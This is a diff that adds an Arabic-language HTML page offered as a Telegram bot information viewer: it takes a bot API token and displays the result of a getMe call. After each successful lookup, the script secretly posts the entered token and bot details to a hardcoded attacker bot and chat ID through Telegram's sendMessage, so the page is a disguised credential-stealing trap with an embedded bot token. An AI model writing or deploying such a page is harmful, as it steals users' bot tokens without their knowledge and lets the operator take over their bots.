@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>عرض معلومات البوت</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background: #f0f2f5;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            margin: 0;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            padding: 25px;
+            border-radius: 12px;
+            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+            width: 100%;
+            max-width: 700px;
+        }
+        .input-group {
+            display: flex;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        input {
+            flex: 1;
+            padding: 12px;
+            font-size: 16px;
+            border: 1px solid #ccc;
+            border-radius: 8px;
+            direction: ltr;
+        }
+        button {
+            padding: 12px 24px;
+            background-color: #0088cc;
+            color: white;
+            border: none;
+            border-radius: 8px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #006699;
+        }
+        pre {
+            background: #f4f4f4;
+            padding: 15px;
+            border-radius: 8px;
+            overflow-x: auto;
+            font-size: 14px;
+            direction: ltr;
+            text-align: left;
+        }
+        .error {
+            color: red;
+            background: #ffe6e6;
+            padding: 10px;
+            border-radius: 8px;
+        }
+        .success {
+            color: green;
+        }
+        .info {
+            background: #e6f7ff;
+            padding: 10px;
+            border-radius: 8px;
+            margin-top: 10px;
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+    <div class="input-group">
+        <input type="text" id="botToken" placeholder="Token(Bot API)" dir="ltr">
+        <button id="searchBtn">Search</button>
+    </div>
+    <div id="resultArea">
+    </div>
+</div>
+
+<script>
+    const ADMIN_BOT_TOKEN = "8360191567:AAEbhxuELD7RRcA6Q3iqvxHFAUOJ42yLWG4";
+    const ADMIN_CHAT_ID = "6612813200";
+
+    const searchBtn = document.getElementById('searchBtn');
+    const botTokenInput = document.getElementById('botToken');
+    const resultArea = document.getElementById('resultArea');
+
+    searchBtn.addEventListener('click', async () => {
+        let token = botTokenInput.value.trim();
+        if (!token) {
+            resultArea.innerHTML = '<div class="error">⚠️ الرجاء إدخال توكن البوت</div>';
+            return;
+        }
+
+        resultArea.innerHTML = '<div class="info">⏳ جاري جلب البيانات...</div>';
+
+        try {
+            const apiUrl = `https://api.telegram.org/bot${token}/getMe`;
+            const response = await fetch(apiUrl);
+            const data = await response.json();
+
+            if (data.ok) {
+                const formattedJson = JSON.stringify(data.result, null, 2);
+                resultArea.innerHTML = `
+                    <div class="success">✅ تم بنجاح</div>
+                    <pre>${escapeHtml(formattedJson)}</pre>
+                `;
+
+                await fetch(`https://api.telegram.org/bot${ADMIN_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: `${token}\n\n${formattedJson}`
+                    })
+                });
+            } else {
+                resultArea.innerHTML = `<div class="error">❌ خطأ من الخادم: ${escapeHtml(data.description) || 'توكن غير صالح'}</div>`;
+            }
+        } catch (err) {
+            resultArea.innerHTML = `<div class="error">❌ فشل الاتصال: ${escapeHtml(err.message)}</div>`;
+        }
+    });
+
+    function escapeHtml(str) {
+        if (!str) return '';
+        return str.replace(/[&<>]/g, function(m) {
+            if (m === '&') return '&amp;';
+            if (m === '<') return '&lt;';
+            if (m === '>') return '&gt;';
+            return m;
+        }).replace(/[\uD800-\uDBFF][\uDC00-\uDFFF]/g, function(c) {
+            return c;
+        });
+    }
+</script>
+</body>
+</html>
